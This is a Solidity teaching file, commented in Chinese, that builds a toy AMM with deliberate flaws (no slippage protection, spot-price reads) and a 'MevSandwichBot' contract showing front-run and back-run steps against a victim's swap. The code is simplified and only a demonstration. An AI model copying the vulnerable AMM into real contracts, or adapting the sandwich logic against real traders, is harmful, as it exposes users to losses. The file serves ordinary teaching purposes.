// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title MEV Sandwich — 教学用最简 DEX 含夹子漏洞
/// @author Shiqiang Chen — 2026

/// 简化版 AMM (如 Uniswap V2)
contract SimpleAMM {
    uint256 public reserve0; // TOKEN
    uint256 public reserve1; // WETH
    
    event Swapped(address indexed user, uint256 amountIn, uint256 amountOut, bool isTokenToWeth);
    
    constructor(uint256 _r0, uint256 _r1) {
        reserve0 = _r0;
        reserve1 = _r1;
    }
    
    /// constant product: x*y = k
    function swapTokenForETH(uint256 amountIn) external returns (uint256) {
        uint256 amountOut = (amountIn * reserve1) / (reserve0 + amountIn);
        reserve0 += amountIn;
        reserve1 -= amountOut;
        // 简化为直接返回ETH
        payable(msg.sender).transfer(amountOut);
        return amountOut;
    }
    
    function swapETHForToken() external payable returns (uint256) {
        uint256 amountOut = (msg.value * reserve0) / (reserve1 + msg.value);
        reserve1 += msg.value;
        reserve0 -= amountOut;
        // 简化
        return amountOut;
    }
    
    function getTokenPrice() external view returns (uint256) {
        return (reserve1 * 1e18) / reserve0;
    }
}

/// ============================================================
/// 攻击合约: MEV Sandwich
/// ============================================================
contract MevSandwichBot {
    SimpleAMM public amm;
    
    constructor(SimpleAMM _amm) { amm = _amm; }
    
    /// 完整的 sandwich 攻击
    /// 受害者: 想用 10 ETH 买 TOKEN
    /// 我们: 抢在他前面买，推高价格，等他买完再卖
    function sandwich(
        uint256 victimEth,     // 受害者愿意花的ETH
        uint256 frontRunEth    // 我们用于抢跑的ETH
    ) external payable returns (uint256 profit) {
        require(msg.value >= frontRunEth, "insufficient eth");
        
        // Step 1: FRONT-RUN — 在受害者之前买TOKEN (推高价格)
        uint256 tokens = amm.swapETHForToken{value: frontRunEth}();
        
        // Step 2: 受害者交易在这里 (链下观察到，模拟执行)
        // victim buys with victimEth → 价格进一步推高
        
        // Step 3: BACK-RUN — 受害者买完后立刻卖 (以更高价格)
        uint256 ethBack = amm.swapTokenForETH(tokens);
        
        // 利润
        profit = ethBack - frontRunEth;
        payable(msg.sender).transfer(profit + msg.value - frontRunEth);
    }
}

/// ============================================================
/// 漏洞1: 无 slippage 保护 — 受害者接受任意价格
/// 漏洞2: getTokenPrice() 用瞬时价格 — 可被 sandwich
/// 漏洞3: 公开 mempool — 任何人都能看到待处理交易
/// ============================================================
